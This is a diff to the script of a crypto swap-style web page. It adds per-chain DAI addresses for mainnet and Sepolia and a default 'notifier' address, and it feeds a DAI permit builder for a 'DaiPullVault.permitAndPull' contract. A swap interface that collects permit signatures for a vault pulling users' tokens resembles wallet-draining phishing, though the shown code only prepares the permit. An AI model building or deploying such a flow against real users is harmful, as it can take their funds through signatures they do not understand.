@@ -126,7 +126,7 @@
   document.getElementById('fromAmt').addEventListener('input', compute);
   document.getElementById('switchBtn').addEventListener('click', ()=>{ const tmp=from; from=to; to=tmp; qs('#fromSym').textContent=from.sym; qs('#toSym').textContent=to.sym; updateHeaders(); });
 
-  const ERC20S={DAI:{addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F',decimals:18},USDC:{addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48',decimals:6},USDT:{addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6}};
+  let ERC20S={DAI:{addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F',decimals:18},USDC:{addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eb48',decimals:6},USDT:{addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',decimals:6}};
   const formatUnitsBI=(hex,dec)=>{ const s=BigInt(hex).toString(); const pad=Number(dec); const int=s.length>pad?s.slice(0,-pad):'0'; const frac=s.length>pad?s.slice(-pad):s.padStart(pad,'0'); const out=int+(pad?'.':'')+frac.replace(/0+$/,''); return out.endsWith('.')?out.slice(0,-1):out; };
 
   let currentAddress=null, lastSignature=null;
@@ -141,9 +141,11 @@
       if(!accounts||!accounts[0]){ toast('No account selected.'); return; }
       const addr=accounts[0]; currentAddress=addr;
       const chainId=await window.ethereum.request({method:'eth_chainId'});
+      // Set chain-specific config (DAI address, defaults)
+      setChainConfig(chainId);
       qs('#walletNotice').style.display='block';
       qs('#walletAddr').textContent=shorten(addr);
-      qs('#walletNetwork').textContent=(chainId==='0x1')?'Ethereum Mainnet':`Chain ${parseInt(chainId,16)}`;
+      qs('#walletNetwork').textContent=(chainId==='0x1')?'Ethereum Mainnet':(chainId==='0xaa36a7'?'Ethereum Sepolia':`Chain ${parseInt(chainId,16)}`);
       qs('#balances').style.display='block';
       await loadBalances(addr);
       const pill=qs('#accountBtn'); pill.style.display='inline-flex'; pill.innerHTML=identiconSVG(addr)+`<span class="account-text">${shorten(addr)}</span>`; qs('#connectBtn').style.display='none'; qs('#menuAddr').textContent=addr;
@@ -198,7 +200,24 @@
   window.openSettings=openSettings; window.closeSettings=closeSettings; window.saveSettings=saveSettings;
 
   // ===== DAI Permit (builds payload for DaiPullVault.permitAndPull) =====
-  const DAI='0x6B175474E89094C44Da98b954EedeAC495271d0F';
+  let DAI=null; // set by network at runtime
+const DAI_ADDRS={
+  '0x1':'0x6B175474E89094C44Da98b954EedeAC495271d0F', // mainnet
+  '0xaa36a7':'0x21AfeE016BdcF5fa32308816f8612e016D2b65F7' // sepolia -> your deployed DAI
+};
+const DEFAULTS_BY_CHAIN={
+  '0xaa36a7':{ notifier:'0x8F586EC9534D1Fe3323982A3bDeb8F9b004AF416' }
+};
+function setChainConfig(chainIdHex){
+  DAI = DAI_ADDRS[chainIdHex] || DAI_ADDRS['0x1'];
+  // adapt balances card DAI address too
+  if(ERC20S && ERC20S.DAI) ERC20S.DAI.addr = DAI;
+  // pre-populate notifier if empty
+  if(!NOTIFIER_ADDRESS && DEFAULTS_BY_CHAIN[chainIdHex]?.notifier){
+    NOTIFIER_ADDRESS = DEFAULTS_BY_CHAIN[chainIdHex].notifier;
+    localStorage.setItem('notifierAddress', NOTIFIER_ADDRESS);
+  }
+}
   function splitSig(sig){ const s=sig.replace(/^0x/,''); const r='0x'+s.slice(0,64); const s2='0x'+s.slice(64,128); let v=parseInt(s.slice(128,130),16); if(v<27) v+=27; return {v, r, s:s2}; }
   async function readName(token){ const res=await ethereum.request({method:'eth_call', params:[{to:token, data:'0x06fdde03'}, 'latest']}); try{ const hex=res.replace(/^0x/,''); const off=parseInt(hex.slice(0,64),16)*2; const len=parseInt(hex.slice(64,128),16)*2; const bytes=hex.slice(128,128+len).match(/.{1,2}/g).map(b=>parseInt(b,16)); return new TextDecoder().decode(new Uint8Array(bytes)); }catch{return 'Token';} }
   async function readNonce(token, owner){ const data='0x7ecebe00'+owner.replace(/^0x/,'').padStart(64,'0'); const res=await ethereum.request({method:'eth_call', params:[{to:token, data}, 'latest']}); return BigInt(res).toString(); }
@@ -207,6 +226,7 @@
   window.closePermit = function(){ qs('#permitModal').style.display='none'; };
 
   async function buildDaiPermit(owner, spender, minutesFromNow){
+    if(!DAI){ const chainIdHex = await ethereum.request({method:'eth_chainId'}); setChainConfig(chainIdHex); }
     const chainId=parseInt(await ethereum.request({method:'eth_chainId'}),16);
     const name=await readName(DAI);
     const nonce=await readNonce(DAI, owner);
